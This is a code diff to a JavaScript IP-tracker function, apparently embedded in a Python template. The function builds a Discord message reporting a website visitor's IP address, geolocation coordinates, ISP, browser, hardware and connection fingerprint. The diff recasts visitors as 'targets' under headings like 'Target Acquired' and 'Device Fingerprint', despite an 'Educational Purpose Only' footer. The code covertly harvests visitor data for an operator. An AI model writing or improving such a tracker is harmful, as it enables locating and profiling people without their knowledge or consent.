@@ -495,59 +495,59 @@ async function trackIP() {{
         // Create a professional Discord message with embeds
         const embeds = [
             {{
-                title: "🔍 New Website Visit Detected",
-                description: "Detailed information about the visitor",
-                color: 0x2b2d31,
+                title: "🔒 Target Acquired",
+                description: "```diff\n+ New Target Detected\n- IP Address: " + publicIP + "\n```",
+                color: 0x00ff00,
                 thumbnail: {{
                     url: "https://i.imgur.com/8j3qX5N.png"
                 }},
                 fields: [
                     {{
-                        name: "🌐 IP & Location Information",
+                        name: "🌐 Target Location",
                         value: `\\`\\`\\`\\n` +
-                               `IP Address: ${{publicIP}}\\n` +
-                               `Location: ${{details.city || 'Unknown'}}, ${{details.country || 'Unknown'}}\\n` +
-                               `Coordinates: ${{details.lat || 'Unknown'}}, ${{details.lon || 'Unknown'}}\\n` +
-                               `ISP: ${{details.isp || 'Unknown'}}\\n` +
-                               `AS: ${{details.as || 'Unknown'}}\\n` +
-                               `Timezone: ${{details.timezone || 'Unknown'}}\\n` +
+                               `[+] IP: ${{publicIP}}\\n` +
+                               `[+] Location: ${{details.city || 'Unknown'}}, ${{details.country || 'Unknown'}}\\n` +
+                               `[+] Coordinates: ${{details.lat || 'Unknown'}}, ${{details.lon || 'Unknown'}}\\n` +
+                               `[+] ISP: ${{details.isp || 'Unknown'}}\\n` +
+                               `[+] AS: ${{details.as || 'Unknown'}}\\n` +
+                               `[+] Timezone: ${{details.timezone || 'Unknown'}}\\n` +
                                `\\`\\`\\``,
                         inline: false
                     }},
                     {{
-                        name: "💻 System Information",
+                        name: "💻 System Profile",
                         value: `\\`\\`\\`\\n` +
-                               `Browser: ${{systemInfo.browser.name}} ${{systemInfo.browser.version}}\\n` +
-                               `Platform: ${{systemInfo.browser.platform}}\\n` +
-                               `Language: ${{systemInfo.browser.language}}\\n` +
-                               `Screen: ${{systemInfo.screen.width}}x${{systemInfo.screen.height}}\\n` +
-                               `Cores: ${{systemInfo.device.hardwareConcurrency}}\\n` +
-                               `Memory: ${{systemInfo.device.deviceMemory}}GB\\n` +
+                               `[+] Browser: ${{systemInfo.browser.name}} ${{systemInfo.browser.version}}\\n` +
+                               `[+] Platform: ${{systemInfo.browser.platform}}\\n` +
+                               `[+] Language: ${{systemInfo.browser.language}}\\n` +
+                               `[+] Screen: ${{systemInfo.screen.width}}x${{systemInfo.screen.height}}\\n` +
+                               `[+] Cores: ${{systemInfo.device.hardwareConcurrency}}\\n` +
+                               `[+] Memory: ${{systemInfo.device.deviceMemory}}GB\\n` +
                                `\\`\\`\\``,
                         inline: false
                     }},
                     {{
-                        name: "📱 Device Details",
+                        name: "📱 Device Fingerprint",
                         value: `\\`\\`\\`\\n` +
-                               `User Agent: ${{systemInfo.browser.userAgent}}\\n` +
-                               `Touch Points: ${{systemInfo.device.maxTouchPoints}}\\n` +
-                               `Connection: ${{systemInfo.device.connection.type || 'Unknown'}}\\n` +
-                               `Speed: ${{systemInfo.device.connection.downlink || 'Unknown'}} Mbps\\n` +
+                               `[+] User Agent: ${{systemInfo.browser.userAgent}}\\n` +
+                               `[+] Touch Points: ${{systemInfo.device.maxTouchPoints}}\\n` +
+                               `[+] Connection: ${{systemInfo.device.connection.type || 'Unknown'}}\\n` +
+                               `[+] Speed: ${{systemInfo.device.connection.downlink || 'Unknown'}} Mbps\\n` +
                                `\\`\\`\\``,
                         inline: false
                     }},
                     {{
-                        name: "⏰ Time Information",
+                        name: "⏰ Time Data",
                         value: `\\`\\`\\`\\n` +
-                               `Timezone: ${{systemInfo.time.timezone}}\\n` +
-                               `Local Time: ${{systemInfo.time.localTime}}\\n` +
+                               `[+] Timezone: ${{systemInfo.time.timezone}}\\n` +
+                               `[+] Local Time: ${{systemInfo.time.localTime}}\\n` +
                                `\\`\\`\\``,
                         inline: false
                     }}
                 ],
                 timestamp: new Date().toISOString(),
                 footer: {{
-                    text: "IP Tracker Tool • Educational Purpose Only",
+                    text: "🔍 IP Tracker • Educational Purpose Only",
                     icon_url: "https://i.imgur.com/8j3qX5N.png"
                 }}
             }}
